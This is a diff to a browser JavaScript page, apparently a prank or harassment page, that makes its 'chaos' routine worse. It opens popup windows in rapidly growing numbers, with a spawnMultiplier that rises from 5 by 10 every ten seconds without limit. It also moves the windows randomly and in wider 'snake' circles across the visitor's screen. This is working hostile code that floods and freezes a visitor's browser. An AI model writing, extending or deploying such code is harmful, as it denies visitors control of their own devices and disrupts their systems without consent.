@@ -38,6 +38,7 @@ if (isMobileDevice()) {
     let browserWindowMovementInterval = null;
     let audioInstances = [];
     let snakeWindows = [];
+    let spawnMultiplier = 5; // Initial number of windows to spawn at once
 
     // Store the verified telegramUsername
     let verifiedUsername = '';
@@ -267,24 +268,30 @@ if (isMobileDevice()) {
         if (isChaosActive) return; // Prevent multiple chaos starts
         isChaosActive = true;
 
-        // Initialize chaos spawning variables
-        let spawnInterval = 200; // Start fast
-        let spawnDecrement = 20; // Decrease interval to speed up
-        let minSpawnInterval = 50; // Minimum interval of 50ms
-
-        // Start spawning chaos windows
+        // Start spawning chaos windows immediately and very rapidly
         chaosInterval = setInterval(() => {
-            for (let i = 0; i < 5; i++) { // Spawn multiple windows at once
+            for (let i = 0; i < spawnMultiplier; i++) {
                 spawnChaosWindow();
             }
+        }, 200); // Spawn windows every 200ms
 
-            // Decrease the spawn interval to speed up spawning
-            if (spawnInterval > minSpawnInterval) {
-                spawnInterval -= spawnDecrement;
-                clearInterval(chaosInterval);
-                chaosInterval = setInterval(arguments.callee, spawnInterval);
-            }
-        }, spawnInterval);
+        // Increase the spawnMultiplier every 10 seconds
+        setTimeout(() => {
+            spawnMultiplier = 10;
+        }, 10000); // After 10 seconds, spawn 10 at a time
+
+        setTimeout(() => {
+            spawnMultiplier = 20;
+        }, 20000); // After another 10 seconds, spawn 20 at a time
+
+        setTimeout(() => {
+            spawnMultiplier = 30;
+        }, 30000); // After another 10 seconds, spawn 30 at a time
+
+        // Continue increasing spawnMultiplier every 10 seconds
+        let multiplierInterval = setInterval(() => {
+            spawnMultiplier += 10;
+        }, 10000);
 
         // Move the chaos windows
         chaosMoveInterval = setInterval(() => {
@@ -345,19 +352,9 @@ if (isMobileDevice()) {
             `);
             chaosWindow.focus();
 
-            // Decide where to position the chaos window
-            let x, y;
-            if (Math.random() < 0.5) {
-                // 50% chance to spawn near the close button area
-                const closeButton = document.querySelector('.control-button.close');
-                const rect = closeButton.getBoundingClientRect();
-                x = window.screenX + rect.left + Math.random() * 100 - 50;
-                y = window.screenY + rect.top + Math.random() * 100 - 50;
-            } else {
-                // Random position on the screen
-                x = Math.floor(Math.random() * (screen.width - width));
-                y = Math.floor(Math.random() * (screen.height - height));
-            }
+            // Random position on the screen
+            const x = Math.floor(Math.random() * (screen.width - width));
+            const y = Math.floor(Math.random() * (screen.height - height));
             chaosWindow.moveTo(x, y);
 
             // Keep track of the chaos window
@@ -370,7 +367,7 @@ if (isMobileDevice()) {
             });
 
             // Assign some windows to move like a snake
-            if (snakeWindows.length < 5 && Math.random() < 0.3) {
+            if (snakeWindows.length < 10 && Math.random() < 0.5) {
                 snakeWindows.push(chaosWindows[chaosWindows.length - 1]);
             }
 
@@ -397,18 +394,8 @@ if (isMobileDevice()) {
 
                 // Move windows that are not snake windows randomly
                 if (!snakeWindows.includes(chaosWindowObj)) {
-                    let x, y;
-                    if (Math.random() < 0.5) {
-                        // 50% chance to move near the close button area
-                        const closeButton = document.querySelector('.control-button.close');
-                        const rect = closeButton.getBoundingClientRect();
-                        x = window.screenX + rect.left + Math.random() * 100 - 50;
-                        y = window.screenY + rect.top + Math.random() * 100 - 50;
-                    } else {
-                        // Random position on the screen
-                        x = Math.floor(Math.random() * (screen.width - width));
-                        y = Math.floor(Math.random() * (screen.height - height));
-                    }
+                    const x = Math.floor(Math.random() * (screen.width - width));
+                    const y = Math.floor(Math.random() * (screen.height - height));
                     chaosWindow.moveTo(x, y);
                 }
             } else {
@@ -428,7 +415,7 @@ if (isMobileDevice()) {
             const chaosWindow = chaosWindowObj.window;
             if (!chaosWindow.closed) {
                 chaosWindowObj.angle += chaosWindowObj.speed;
-                const radius = 200; // Movement radius
+                const radius = 300; // Movement radius
                 const x = chaosWindowObj.startX + radius * Math.cos(chaosWindowObj.angle * Math.PI / 180);
                 const y = chaosWindowObj.startY + radius * Math.sin(chaosWindowObj.angle * Math.PI / 180);
                 chaosWindow.moveTo(x, y);
